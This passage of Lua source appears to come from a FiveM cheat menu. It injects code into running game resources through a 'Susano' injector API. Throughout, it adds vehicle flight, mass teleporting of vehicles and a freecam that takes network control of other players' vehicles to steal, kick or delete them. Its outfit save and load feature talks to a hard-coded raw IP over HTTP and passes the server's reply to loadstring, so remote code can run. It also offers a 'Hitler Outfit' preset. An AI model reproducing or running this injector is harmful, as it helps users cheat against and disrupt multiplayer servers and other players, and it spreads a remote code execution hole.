                                    TaskLeaveVehicle(player, vehicle, 16)
                                else
                                    if not activeControls then
                                        SetVehicleGravityAmountFunc(vehicle, 9.8)
                                        SetVehicleFixed(vehicle)
                                    end
                                    TaskWarpPedIntoVehicle(player, vehicle, -1)
                                end
                                lastKeyPress = GetGameTimer()
                            end
                            
                            if IsControlJustPressed(0, 29) then
                                VerticalFlyingEnabled = not VerticalFlyingEnabled
                                if VerticalFlyingEnabled then
                                    PlaySoundFrontend(-1, "SELECT", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                else
                                    PlaySoundFrontend(-1, "BACK", "HUD_FRONTEND_DEFAULT_SOUNDSET", true)
                                end
                                lastKeyPress = GetGameTimer()
                            end
                            
                            if IsEntityPositionFrozen(vehicle) then
                                FreezeEntityPositionFunc(vehicle, false)
                            end
                            
                            if activeControls then
                                SetVehicleGravityAmountFunc(vehicle, 0.0)
                                
                                local camRot = GetGameplayCamRot(0)
                                local camYaw = camRot.z
                                
                                local currentRot = GetEntityRotationFunc(vehicle, 2)
                                local angleDiff = ((camYaw - currentRot.z + 180) % 360) - 180
                                local newHeading = currentRot.z + (angleDiff * 0.1)
                                SetEntityRotationFunc(vehicle, 0.0, 0.0, newHeading, 2, true)
                                
                                if VehicleSpeed ~= 0 then
                                    local camRadians = math.rad(camYaw)
                                    local dirX = -math.sin(camRadians)
                                    local dirY = math.cos(camRadians)
                                    local dirZ = 0.0
                                    
                                    if VerticalFlyingEnabled then
                                        dirZ = lookDirection.z * 1.5
                                    end
                                    
                                    if IsControlPressed(0, 44) then
                                        dirZ = 1.0
                                    end
                                    
                                    local dx, dy, dz = NormalizeVector(dirX, dirY, dirZ)
                                    
                                    if VerticalFlyingEnabled then
                                        dz = dz * 1.5
                                        local magnitude = math.sqrt(dx*dx + dy*dy + dz*dz)
                                        if magnitude > 0 then
                                            dx = dx / magnitude
                                            dy = dy / magnitude
                                            dz = dz / magnitude
                                        end
                                    end
                                    
                                    local speedMult = VehicleSpeedMultiplier or 1.0
                                    
                                    SetEntityVelocityFunc(vehicle, 
                                        dx * VehicleSpeed * speedMult,
                                        dy * VehicleSpeed * speedMult,
                                        dz * VehicleSpeed * speedMult
                                    )
                                end
                            else
                                SetVehicleGravityAmountFunc(vehicle, 9.8)
                                local handlingNeedsReset = false
                                
                                local currentMass = GetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass")
                                local currentDrag = GetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff")
                                
                                if currentMass < 100.0 or currentMass > 3000.0 or 
                                   currentDrag < 1.0 or currentDrag > 20.0 then
                                    handlingNeedsReset = true
                                end
                                
                                if handlingNeedsReset then
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fMass", 1500.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fInitialDragCoeff", 10.0)
                                    SetVehicleHandlingFloat(vehicle, "CHandlingData", "fDriveBiasFront", 0.5)
                                    ModifyVehicleTopSpeed(vehicle, 1.0)
                                end
                            end
                        end
                        Wait(0)
                    end
                end)
            end

            VkEyTrXpZdQl()
        ]]
        
        Susano.InjectResource("any", injectionCode)
    else
        local injectionCode = [[
            PqLmYgZxWvTrHs = false
            
            local player = PlayerPedId()
            local playerPos = GetEntityCoords(player)
            
            local vehicle = GetVehiclePedIsIn(player, false)
            if vehicle and vehicle ~= 0 then
                SetVehicleGravityAmount(vehicle, 9.8)
                if IsEntityPositionFrozen(vehicle) then
                    FreezeEntityPosition(vehicle, false)
                end
                SetVehicleFixed(vehicle)
                SetVehicleEngineOn(vehicle, true, true, false)
                local speed = GetEntitySpeed(vehicle)
                if speed < 0.1 then
                    SetEntityVelocity(vehicle, 0.0, 0.0, 0.0)
                end
            end
            
            local vehicles = GetGamePool('CVehicle')
            for _, veh in ipairs(vehicles) do
                if veh ~= 0 and veh ~= vehicle then
                    local vehPos = GetEntityCoords(veh)
                    local dist = #(playerPos - vehPos)
                    if dist < 100.0 then
                        SetVehicleGravityAmount(veh, 9.8)
                        if IsEntityPositionFrozen(veh) then
                            FreezeEntityPosition(veh, false)
                        end
                        SetVehicleFixed(veh)
                    end
                end
            end
        ]]
        
        Susano.InjectResource("any", injectionCode)
    end
end

Actions.gravitateVehicleItem = FindItem("Vehicle", "Performance", "Gravitate Vehicle")
Actions.gravitateSpeedItem = FindItem("Vehicle", "Performance", "Gravitate Speed")

if Actions.gravitateVehicleItem then
    Actions.gravitateVehicleItem.onClick = function(value)
        local speed = 100
        if Actions.gravitateSpeedItem and Actions.gravitateSpeedItem.value then
            speed = Actions.gravitateSpeedItem.value
        end
        ToggleGravitateVehicle(value, speed)
    end
end

if Actions.gravitateSpeedItem then
    Actions.gravitateSpeedItem.onClick = function(value)
        if Actions.gravitateVehicleItem and Actions.gravitateVehicleItem.value then
            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                Susano.InjectResource("any", [[
                    if PqLmYgZxWvTrHs then
                        VehicleMaxSpeed = ]] .. tostring(value) .. [[.0
                        VehicleBaseSpeed = ]] .. tostring(value) .. [[.0
                        VehicleAcceleration = ]] .. tostring(math.max(1.0, value / 100.0)) .. [[
                    end
                ]])
            end
        end
    end
end



-- [REMOVED] Actions.godmodeItem handler (menu item deleted)
-- [REMOVED] Actions.semiGodmodeItem handler (menu item deleted)
-- [REMOVED] Actions.antiHeadshotItem handler (menu item deleted)


-- [REMOVED] Noclip + NoclipType handlers (Movement tab deleted)

Actions.tpAllVehiclesItem = FindItem("Player", "Self", "TP all vehicle to me")
if Actions.tpAllVehiclesItem then
    Actions.tpAllVehiclesItem.onClick = function()
        Menu.ActionTPAllVehiclesToMe()
    end
end

Actions.reviveItem = FindItem("Player", "Self", "Revive")
if Actions.reviveItem then
    Actions.reviveItem.onClick = function()
        Menu.ActionRevive()
    end
end

-- [REMOVED] Actions.maxHealthItem + maxArmorItem handlers (menu items deleted)
Actions.detachItem = FindItem("Player", "Self", "Detach All Entitys")
if Actions.detachItem then
    Actions.detachItem.onClick = function()
        Menu.ActionDetachAllEntitys()
    end
end

Actions.soloSessionItem = FindItem("Player", "Self", "Solo Session")
if Actions.soloSessionItem then
    Actions.soloSessionItem.onClick = function(value)
        ToggleSoloSession(value)
    end
end

Actions.throwVehicleItem = FindItem("Player", "Self", "Throw Vehicle")
if Actions.throwVehicleItem then
    Actions.throwVehicleItem.onClick = function(value)
        ToggleThrowVehicle(value)
    end
end



-- [REMOVED] Actions.fastRunItem handler (menu item deleted)
-- [REMOVED] Actions.noRagdollItem handler (menu item deleted)


Actions.tinyPlayerItem = FindItem("Player", "Self", "Tiny Player")
if Actions.tinyPlayerItem then
    Actions.tinyPlayerItem.onClick = function(value)
        ToggleTinyPlayer(value)
    end
end

-- [REMOVED] Actions.infiniteStaminaItem handler (menu item deleted)


Actions.deleteAllPropsItem = FindItem("Visual", "World", "Delete All Props")
if Actions.deleteAllPropsItem then
    Actions.deleteAllPropsItem.onClick = function()
        DeleteAllProps()
    end
end

Actions.randomOutfitItem = FindItem("Player", "Wardrobe", "Random Outfit")
if Actions.randomOutfitItem then
    Actions.randomOutfitItem.onClick = function()
        Menu.ActionRandomOutfit()
    end
end

-- Simple JSON encoder function (local copy for outfit saving)
local function SimpleJsonEncodeOutfit(tbl, indent)
    indent = indent or 0
    local result = {}
    local isArray = true
    local maxIndex = 0
    
    for k, v in pairs(tbl) do
        if type(k) ~= "number" then
            isArray = false
            break
        end
        if k > maxIndex then maxIndex = k end
    end
    
    if maxIndex ~= #tbl then isArray = false end
    
    for k, v in pairs(tbl) do
        local key
        if isArray then
            key = ""
        else
            key = type(k) == "string" and '"' .. string.gsub(k, '"', '\\"') .. '"' or tostring(k)
        end
        
        local value
        if type(v) == "table" then
            value = SimpleJsonEncodeOutfit(v, indent + 1)
        elseif type(v) == "string" then
            value = '"' .. string.gsub(v, '"', '\\"') .. '"'
        elseif type(v) == "boolean" then
            value = v and "true" or "false"
        elseif type(v) == "number" then
            value = tostring(v)
        else
            value = '"' .. tostring(v) .. '"'
        end
        
        if isArray then
            table.insert(result, value)
        else
            table.insert(result, key .. ":" .. value)
        end
    end
    
    if isArray then
        return "[" .. table.concat(result, ",") .. "]"
    else
        return "{" .. table.concat(result, ",") .. "}"
    end
end

local function CollectCurrentOutfit()
    local ped = PlayerPedId()
    if not ped or not DoesEntityExist(ped) then
        return nil
    end
    
    local outfit = {}
    
    -- Get head blend data
    local shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird, shapeMix, skinMix, thirdMix = GetPedHeadBlendData(ped)
    outfit.sex = shapeFirst or 0
    outfit.face = shapeFirst or 0
    outfit.skin = skinFirst or 0
    
    -- Get hair
    outfit.hair_1 = GetPedDrawableVariation(ped, 2) or 0
    outfit.hair_2 = GetPedTextureVariation(ped, 2) or 0
    local hairColor, highlightColor = GetPedHairColor(ped)
    outfit.hair_color_1 = hairColor or 0
    outfit.hair_color_2 = highlightColor or 0
    
    -- Get components (0-11)
    outfit.decals_1 = GetPedDrawableVariation(ped, 10) or 0
    outfit.decals_2 = GetPedTextureVariation(ped, 10) or 0
    outfit.tshirt_1 = GetPedDrawableVariation(ped, 8) or 0
    outfit.tshirt_2 = GetPedTextureVariation(ped, 8) or 0
    outfit.torso_1 = GetPedDrawableVariation(ped, 11) or 0
    outfit.torso_2 = GetPedTextureVariation(ped, 11) or 0
    outfit.arms = GetPedDrawableVariation(ped, 3) or 0
    outfit.pants_1 = GetPedDrawableVariation(ped, 4) or 0
    outfit.pants_2 = GetPedTextureVariation(ped, 4) or 0
    outfit.shoes_1 = GetPedDrawableVariation(ped, 6) or 0
    outfit.shoes_2 = GetPedTextureVariation(ped, 6) or 0
    outfit.mask_1 = GetPedDrawableVariation(ped, 1) or 0
    outfit.mask_2 = GetPedTextureVariation(ped, 1) or 0
    outfit.bproof_1 = GetPedDrawableVariation(ped, 9) or 0
    outfit.bproof_2 = GetPedTextureVariation(ped, 9) or 0
    outfit.bags_1 = GetPedDrawableVariation(ped, 5) or 0
    outfit.bags_2 = GetPedTextureVariation(ped, 5) or 0
    
    -- Get props (0-7)
    local helmetProp = GetPedPropIndex(ped, 0)
    outfit.helmet_1 = (helmetProp ~= -1) and helmetProp or 0
    outfit.helmet_2 = (helmetProp ~= -1) and GetPedPropTextureIndex(ped, 0) or 0
    
    local glassesProp = GetPedPropIndex(ped, 1)
    outfit.glasses_1 = (glassesProp ~= -1) and glassesProp or 0
    outfit.glasses_2 = (glassesProp ~= -1) and GetPedPropTextureIndex(ped, 1) or 0
    
    -- Get beard/overlay (set default values as this native may not be available)
    outfit.beard_1 = 0
    outfit.beard_2 = 0
    outfit.beard_3 = 0
    outfit.beard_4 = 0
    
    -- Get chain/accessory
    outfit.chain_1 = GetPedDrawableVariation(ped, 7) or 0
    outfit.chain_2 = GetPedTextureVariation(ped, 7) or 0
    
    return outfit
end

Actions.saveOutfitItem = FindItem("Player", "Wardrobe", "Save Outfit")
if Actions.saveOutfitItem then
    Actions.saveOutfitItem.onClick = function()
        if Menu and Menu.OpenInput then
            Menu.OpenInput("Save Outfit", "Enter a code for your outfit:", function(code)
                if not code or code == "" then return end
                
                code = string.lower(string.gsub(code, "%s+", ""))
                
                local outfit = CollectCurrentOutfit()
                
                if not outfit then
                    if Menu and Menu.OpenInput then
                        Menu.OpenInput("Error", "Failed to collect outfit data", function() end)
                    end
                    return
                end
                
                CreateThread(function()
                    local jsonData = SimpleJsonEncodeOutfit({ code = code, outfit = outfit })
                    local baseUrl = "http://82.22.7.19:25010"
                    
                    if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                        local encodedData = ""
                        for i = 1, #jsonData do
                            local byte = string.byte(jsonData, i)
                            if (byte >= 48 and byte <= 57) or (byte >= 65 and byte <= 90) or (byte >= 97 and byte <= 122) or byte == 45 or byte == 95 or byte == 46 or byte == 126 then
                                encodedData = encodedData .. string.char(byte)
                            else
                                encodedData = encodedData .. string.format("%%%02X", byte)
                            end
                        end
                        
                        local getUrl = baseUrl .. "/outfit/save?data=" .. encodedData
                        local status, response = Susano.HttpGet(getUrl)
                        
                        if status == 200 then
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Success", "Outfit saved successfully!", function() end)
                            end
                        else
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "Failed to save outfit. Status: " .. tostring(status), function() end)
                            end
                        end
                    else
                        if Menu and Menu.OpenInput then
                            Menu.OpenInput("Error", "HTTP functions not available", function() end)
                        end
                    end
                end)
            end)
        end
    end
end

local function ApplyOutfit(outfit)
    if not outfit then return false end
    
    local ped = PlayerPedId()
    if not ped or not DoesEntityExist(ped) then
        return false
    end
    
    -- Apply outfit using skinchanger event if available
    if TriggerEvent then
        TriggerEvent('skinchanger:loadSkin', outfit)
    end
    
    -- Also apply directly using natives as fallback
    CreateThread(function()
        Wait(100)
        
        -- Set head blend data
        if outfit.face and outfit.skin then
            SetPedHeadBlendData(ped, outfit.face or 0, outfit.face or 0, 0, outfit.skin or 0, outfit.skin or 0, 0, 1.0, 1.0, 0.0, false)
        end
        
        -- Set hair
        if outfit.hair_1 then
            SetPedComponentVariation(ped, 2, outfit.hair_1, outfit.hair_2 or 0, 0)
        end
        if outfit.hair_color_1 then
            SetPedHairColor(ped, outfit.hair_color_1 or 0, outfit.hair_color_2 or 0)
        end
        
        -- Set components
        if outfit.decals_1 then SetPedComponentVariation(ped, 10, outfit.decals_1, outfit.decals_2 or 0, 0) end
        if outfit.tshirt_1 then SetPedComponentVariation(ped, 8, outfit.tshirt_1, outfit.tshirt_2 or 0, 0) end
        if outfit.torso_1 then SetPedComponentVariation(ped, 11, outfit.torso_1, outfit.torso_2 or 0, 0) end
        if outfit.arms then SetPedComponentVariation(ped, 3, outfit.arms, 0, 0) end
        if outfit.pants_1 then SetPedComponentVariation(ped, 4, outfit.pants_1, outfit.pants_2 or 0, 0) end
        if outfit.shoes_1 then SetPedComponentVariation(ped, 6, outfit.shoes_1, outfit.shoes_2 or 0, 0) end
        if outfit.mask_1 then SetPedComponentVariation(ped, 1, outfit.mask_1, outfit.mask_2 or 0, 0) end
        if outfit.bproof_1 then SetPedComponentVariation(ped, 9, outfit.bproof_1, outfit.bproof_2 or 0, 0) end
        if outfit.bags_1 then SetPedComponentVariation(ped, 5, outfit.bags_1, outfit.bags_2 or 0, 0) end
        if outfit.chain_1 then SetPedComponentVariation(ped, 7, outfit.chain_1, outfit.chain_2 or 0, 0) end
        
        -- Set props
        if outfit.helmet_1 and outfit.helmet_1 > 0 then
            SetPedPropIndex(ped, 0, outfit.helmet_1, outfit.helmet_2 or 0, true)
        else
            ClearPedProp(ped, 0)
        end
        
        if outfit.glasses_1 and outfit.glasses_1 > 0 then
            SetPedPropIndex(ped, 1, outfit.glasses_1, outfit.glasses_2 or 0, true)
        else
            ClearPedProp(ped, 1)
        end
    end)
    
    return true
end

Actions.loadOutfitItem = FindItem("Player", "Wardrobe", "Load Outfit")
if Actions.loadOutfitItem then
    Actions.loadOutfitItem.onClick = function()
        if Menu and Menu.OpenInput then
            Menu.OpenInput("Load Outfit", "Enter outfit code:", function(code)
                if not code or code == "" then return end
                
                code = string.lower(string.gsub(code, "%s+", ""))
                
                if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                    CreateThread(function()
                        local status, response = Susano.HttpGet("http://82.22.7.19:25010/outfit/load?code=" .. code)
                        
                        if status == 200 and response then
                            if type(response) ~= "string" then
                                response = tostring(response)
                            end
                            
                            local success, data, parseErr = pcall(function()
                                if json and type(json.decode) == "function" then
                                    return json.decode(response)
                                elseif loadstring then
                                    local func = loadstring("return " .. response)
                                    if func then
                                        return func()
                                    end
                                end
                                return nil
                            end)
                            
                            if not success then
                                parseErr = data
                                data = nil
                            end
                            
                            if success and data then
                                local outfitToApply = data.outfit or data
                                if outfitToApply and type(outfitToApply) == "table" then
                                    Wait(100)
                                    
                                    local applySuccess = ApplyOutfit(outfitToApply)
                                    
                                    if not applySuccess then
                                        if Menu and Menu.OpenInput then
                                            Menu.OpenInput("Error", "Failed to apply outfit", function() end)
                                        end
                                    end
                                else
                                    if Menu and Menu.OpenInput then
                                        Menu.OpenInput("Error", "Invalid outfit format", function() end)
                                    end
                                end
                            else
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "Failed to parse outfit: " .. tostring(parseErr or "Unknown error"), function() end)
                                end
                            end
                        elseif status == 404 then
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "Outfit not found!", function() end)
                            end
                        else
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "Failed to load outfit. Status: " .. tostring(status), function() end)
                            end
                        end
                    end)
                else
                    if Menu and Menu.OpenInput then
                        Menu.OpenInput("Error", "HTTP functions not available", function() end)
                    end
                end
            end)
        end
    end
end

function Menu.ActionHitlerOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 13,
        skin         = 1,
        hair_1       = 18,
        hair_2       = 0,
        hair_color_1 = 0,
        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 10,
        tshirt_2     = 0,
        torso_1      = 72,
        torso_2      = 1,
        arms         = 33,
        pants_1      = 24,
        pants_2      = 1,
        shoes_1      = 38,
        shoes_2      = 0,
        mask_1       = 0,
        mask_2       = 0,
        helmet_1     = 113,
        helmet_2     = 0,
        bproof_1     = 0,
        bproof_2     = 0,
        bags_1       = 0,
        bags_2       = 0,
        beard_1      = 9,
        beard_2      = 10,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 38,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

function Menu.ActionStaffOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 1,
        skin         = 1,
        hair_1       = 1,
        hair_2       = 0,
        hair_color_1 = 0,
        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 15,
        tshirt_2     = 0,
        torso_1      = 178,
        torso_2      = 0,
        arms         = 1,
        pants_1      = 77,
        pants_2      = 0,
        shoes_1      = 55,
        shoes_2      = 0,
        mask_1       = 0,
        mask_2       = 0,
        helmet_1       = 151,
        helmet_2       = 0,
        bproof_1     = 0,
        bproof_2     = 0,
        bags_1         = 0,
        bags_2         = 0,
        beard_1      = 9,
        beard_2      = 10,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 3,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

function Menu.ActionBnzOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 43,
        skin         = 1,
        hair_1       = 0,
        hair_2       = 0,
        hair_color_1 = 0,
        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 200,
        tshirt_2     = 0,
        torso_1      = 496,
        torso_2      = 0,
        arms         = 17,
        pants_1      = 457,
        pants_2      = 0,
        shoes_1      = 275,
        shoes_2      = 0,
        mask_1       = 214,
        mask_2       = 1,
        helmet_1     = -1,
        helmet_2     = -1,
        bproof_1     = 163,
        bproof_2     = 0,
        bags_1       = 133,
        bags_2       = 0,
        beard_1      = 0,
        beard_2      = 10,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 330,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

function Menu.ActionJyOutfit()
    local Config = {
        Outfit = {
            sex          = 0,
            face         = 42,
            skin         = 1,
            hair_1       = 0,
            hair_2       = 0,
            hair_color_1 = 0,
            hair_color_2 = 0,
            decals_1     = 0,
            decals_2     = 0,
            tshirt_1     = 15,
            tshirt_2     = 0,
            torso_1      = 924,
            torso_2      = 0,
            arms         = 78,
            pants_1      = 16,
            pants_2      = 3,
            shoes_1      = 208,
            shoes_2      = 5,
            mask_1       = 256,
            mask_2       = 0,
            helmet_1     = 244,
            helmet_2     = 0,
            bproof_1     = 0,
            bproof_2     = 0,
            bags_1       = 152,
            bags_2       = 0,
            beard_1      = 0,
            beard_2      = 10,
            beard_3      = 0,
            beard_4      = 0,
            chain_1      = 180,
            chain_2      = 0,
            glasses_1    = 71,
            glasses_2    = 0
        }
    }
    
    TriggerEvent('skinchanger:loadSkin', Config.Outfit)
    
    CreateThread(function()
        while true do
            Wait(3000)
            
            local ped = PlayerPedId()
            
            if GetPlayerPedPropIndex(ped, 0) ~= Config.Outfit.helmet_1 then
                SetPedPropIndex(ped, 0, Config.Outfit.helmet_1, Config.Outfit.helmet_2, true)
            end
            
            if GetPlayerPedPropIndex(ped, 1) ~= Config.Outfit.glasses_1 then
                SetPedPropIndex(ped, 1, Config.Outfit.glasses_1, Config.Outfit.glasses_2, true)
            end
            
            if GetPedDrawableVariation(ped, 1) ~= Config.Outfit.mask_1 then
                SetPedComponentVariation(ped, 1, Config.Outfit.mask_1, Config.Outfit.mask_2, 0)
            end
        end
    end)
end

function Menu.ActionWOutfit()
    TriggerEvent('skinchanger:loadSkin', {
        sex          = 0,
        face         = 0,
        skin         = 0,
        hair_1       = 0,
        hair_2       = 0,
        hair_color_1 = 0,
        hair_color_2 = 0,
        decals_1     = 0,
        decals_2     = 0,
        tshirt_1     = 15,
        tshirt_2     = 0,
        torso_1      = 271,
        torso_2      = 3,
        arms         = 2,
        pants_1      = 258,
        pants_2      = 0,
        shoes_1      = 149,
        shoes_2      = 0,
        mask_1       = 95,
        mask_2       = 0,
        helmet_1     = -1,
        helmet_2     = -1,
        bproof_1     = 0,
        bproof_2     = 0,
        bags_1       = 0,
        bags_2       = 0,
        beard_1      = 0,
        beard_2      = 0,
        beard_3      = 0,
        beard_4      = 0,
        chain_1      = 0,
        chain_2      = 0,
        glasses_1    = 0,
        glasses_2    = 0,
    })
end

Actions.outfitItem = FindItem("Player", "Wardrobe", "Outfit")
if Actions.outfitItem then
    Actions.outfitItem.onClick = function(index, option)
        if option == "bnz outfit" then
            Menu.ActionBnzOutfit()
        elseif option == "Staff Outfit" then
            Menu.ActionStaffOutfit()
        elseif option == "Hitler Outfit" then
            Menu.ActionHitlerOutfit()
        elseif option == "jy" then
            Menu.ActionJyOutfit()
        elseif option == "w outfit" then
            Menu.ActionWOutfit()
        end
    end
end

local function _clampInt(v, mn, mx)
    v = tonumber(v) or mn
    if v < mn then return mn end
    if v > mx then return mx end
    return math.floor(v)
end

local function _applyWardrobeSelection(itemName, selectedIndex)
    local ped = PlayerPedId()
    if not ped or ped == 0 or not DoesEntityExist(ped) then
        return selectedIndex
    end

    selectedIndex = tonumber(selectedIndex) or 1
    if selectedIndex < 1 then selectedIndex = 1 end

    if itemName == "Hat" or itemName == "Glasses" then
        local propId = (itemName == "Hat") and 0 or 1
        local count = GetNumberOfPedPropDrawableVariations(ped, propId) or 0
        if count <= 0 then
            ClearPedProp(ped, propId)
            return 1
        end

        local clamped = _clampInt(selectedIndex, 1, count)
        local drawable = clamped - 1
        local texCount = GetNumberOfPedPropTextureVariations(ped, propId, drawable) or 0
        local texture = (texCount > 0) and 0 or 0

        ClearPedProp(ped, propId)
        SetPedPropIndex(ped, propId, drawable, texture, true)
        return clamped
    end

    local componentId = nil
    if itemName == "Mask" then componentId = 1
    elseif itemName == "Torso" then componentId = 11
    elseif itemName == "Tshirt" then componentId = 8
    elseif itemName == "Pants" then componentId = 4
    elseif itemName == "Shoes" then componentId = 6
    end

    if componentId ~= nil then
        local count = GetNumberOfPedDrawableVariations(ped, componentId) or 0
        if count <= 0 then
            return 1
        end

        local clamped = _clampInt(selectedIndex, 1, count)
        local drawable = clamped - 1
        local texCount = GetNumberOfPedTextureVariations(ped, componentId, drawable) or 0
        local texture = (texCount > 0) and 0 or 0

        SetPedComponentVariation(ped, componentId, drawable, texture, 0)
        return clamped
    end

    return selectedIndex
end

local function _bindWardrobeSelector(itemName)
    local item = FindItem("Player", "Wardrobe", itemName)
    if not item then return end

    item.onClick = function(index, _)
        local clamped = _applyWardrobeSelection(itemName, index)
        if clamped and item.selected ~= clamped then
            item.selected = clamped
        end
    end
end

_bindWardrobeSelector("Hat")
_bindWardrobeSelector("Mask")
_bindWardrobeSelector("Glasses")
_bindWardrobeSelector("Torso")
_bindWardrobeSelector("Tshirt")
_bindWardrobeSelector("Pants")
_bindWardrobeSelector("Shoes")

Menu.freecamEnabled = false
local freecamSpeed = 0.5
local freecamFov = 50.0

local freecam_active = false
local cam_pos = vector3(0, 0, 0)
local cam_rot = vector3(0, 0, 0)
local original_pos = vector3(0, 0, 0)
local freecam_just_started = false
local last_click_time = 0
local freecam_mode = 1
local freecam_max_mode = 2

local FreecamOptions = {"Teleport", "Warp Vehicle", "Shoot Bullet", "Kick Vehicle", "Fuck Vehicle", "Steal Vehicle", "Delete Vehicle"}
local FreecamSelectedOption = 1
local FreecamScrollOffset = 0

local lastScrollTime = 0
local lastScrollValue = 0.0

local VK_W = 0x57
local VK_A = 0x41
local VK_S = 0x53
local VK_D = 0x44
local VK_Q = 0x51
local VK_E = 0x45
local VK_Z = 0x5A
local VK_SHIFT = 0x10
local VK_SPACE = 0x20
local VK_CONTROL = 0x11
local VK_LBUTTON = 0x01
local VK_RBUTTON = 0x02

local normal_speed = 0.5
local fast_speed = 2.5

function StartFreecam()
    local ped = PlayerPedId()
    original_pos = GetEntityCoords(ped)
    cam_pos = vector3(original_pos.x, original_pos.y, original_pos.z)
    
    local currentRot = GetGameplayCamRot(2)
    cam_rot = vector3(currentRot.x, currentRot.y, currentRot.z)
    
    FreezeEntityPosition(ped, true)
    ClearPedTasksImmediately(ped)
    SetEntityInvincible(ped, true)
    Susano.LockCameraPos(true)
    
    freecam_active = true
    freecam_just_started = true
    last_click_time = GetGameTimer()
    
    
    Citizen.CreateThread(function()
        Citizen.Wait(500)
        freecam_just_started = false
    end)
end

function StopFreecam()
    local ped = PlayerPedId()
    
    Susano.LockCameraPos(false)
    FreezeEntityPosition(ped, false)
    SetEntityInvincible(ped, false)
    ClearFocus()
    
    freecam_active = false
end

function TeleportToFreecam()
    if type(Susano) ~= "table" or type(Susano.InjectResource) ~= "function" then
        return
    end
    
    local ped = PlayerPedId()
    local currentCamCoords = cam_pos
    local currentCamRot = cam_rot
    
    local pitch = math.rad(currentCamRot.x)
    local yaw = math.rad(currentCamRot.z)
    
    local dirX = -math.sin(yaw) * math.cos(pitch)
    local dirY = math.cos(yaw) * math.cos(pitch)
    local dirZ = math.sin(pitch)
    
    local direction = vector3(dirX, dirY, dirZ)
    
    Susano.InjectResource("any", string.format([[
        local ped = PlayerPedId()
        local camCoords = vector3(%f, %f, %f)
        local direction = vector3(%f, %f, %f)
        
        local raycastStart = camCoords
        local raycastEnd = vector3(
            camCoords.x + direction.x * 1000.0,
            camCoords.y + direction.y * 1000.0,
            camCoords.z + direction.z * 1000.0
        )
        
        local raycast = StartExpensiveSynchronousShapeTestLosProbe(
            raycastStart.x, raycastStart.y, raycastStart.z,
            raycastEnd.x, raycastEnd.y, raycastEnd.z,
            -1, ped, 7
        )
        
        local _, hit, endCoords, surfaceNormal, entityHit = GetShapeTestResult(raycast)
        
        if hit and entityHit and DoesEntityExist(entityHit) and GetEntityType(entityHit) == 2 then
            local targetVehicle = entityHit
            local playerPed = ped
            
            SetEntityAsMissionEntity(targetVehicle, true, true)
            if NetworkGetEntityIsNetworked(targetVehicle) then
                NetworkRequestControlOfEntity(targetVehicle)
                local attempts = 0
                while not NetworkHasControlOfEntity(targetVehicle) and attempts < 100 do
                    Wait(0)
                    attempts = attempts + 1
                    NetworkRequestControlOfEntity(targetVehicle)
                end
            end
            
            SetVehicleDoorsLocked(targetVehicle, 1)
            SetVehicleDoorsLockedForAllPlayers(targetVehicle, false)
            
            local freeSeat = -1
            local maxSeats = GetVehicleMaxNumberOfPassengers(targetVehicle)
            
            local driverSeat = GetPedInVehicleSeat(targetVehicle, -1)
            if driverSeat == 0 or not DoesEntityExist(driverSeat) then
                freeSeat = -1
            else
                for i = 0, maxSeats - 1 do
                    local seatPed = GetPedInVehicleSeat(targetVehicle, i)
                    if seatPed == 0 or not DoesEntityExist(seatPed) then
                        freeSeat = i
                        break
                    end
                end
            end
            
            if freeSeat ~= -1 then
                ClearPedTasksImmediately(playerPed)
                Wait(50)
                SetPedIntoVehicle(playerPed, targetVehicle, freeSeat)
                Wait(100)
                
                if not IsPedInVehicle(playerPed, targetVehicle, false) then
                    local vehicleCoords = GetEntityCoords(targetVehicle)
                    SetEntityCoords(playerPed, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                    Wait(50)
                    SetPedIntoVehicle(playerPed, targetVehicle, freeSeat)
                end
            else
                ClearPedTasksImmediately(playerPed)
                Wait(50)
                SetPedIntoVehicle(playerPed, targetVehicle, -1)
                Wait(100)
                
                if not IsPedInVehicle(playerPed, targetVehicle, false) then
                    local vehicleCoords = GetEntityCoords(targetVehicle)
                    SetEntityCoords(ped, vehicleCoords.x, vehicleCoords.y, vehicleCoords.z + 1.0, false, false, false, false)
                end
            end
        elseif hit and endCoords and endCoords.x ~= 0.0 and endCoords.y ~= 0.0 and endCoords.z ~= 0.0 then
            SetEntityCoords(ped, endCoords.x, endCoords.y, endCoords.z, false, false, false, false)
        else
            local teleportPos = vector3(
                camCoords.x + direction.x * 5.0,
                camCoords.y + direction.y * 5.0,
                camCoords.z + direction.z * 5.0
            )
            SetEntityCoords(ped, teleportPos.x, teleportPos.y, teleportPos.z, false, false, false, false)
        end
    ]], currentCamCoords.x, currentCamCoords.y, currentCamCoords.z, direction.x, direction.y, direction.z))
end

function ForceWorldLoad()
    RequestCollisionAtCoord(cam_pos.x, cam_pos.y, cam_pos.z)
    SetFocusPosAndVel(cam_pos.x, cam_pos.y, cam_pos.z, 0.0, 0.0, 0.0)
